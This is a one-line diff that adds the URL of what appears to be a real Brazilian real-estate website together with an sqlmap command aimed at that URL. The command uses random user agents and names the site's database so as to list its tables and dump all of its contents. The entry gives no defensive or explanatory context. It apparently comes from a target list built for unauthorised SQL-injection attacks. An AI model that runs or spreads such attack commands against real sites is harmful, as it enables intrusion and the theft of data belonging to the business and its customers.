@@ -1,0 +1,1 @@
+https://www.imobiliariaaliancatupa.com.br/?:=busca&tt=atd&negocio=1&tipo=11 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.imobiliariaaliancatupa.com.br/?:=busca&tt=atd&negocio=1&tipo=11 -D imobalia_site --tables --dump-all
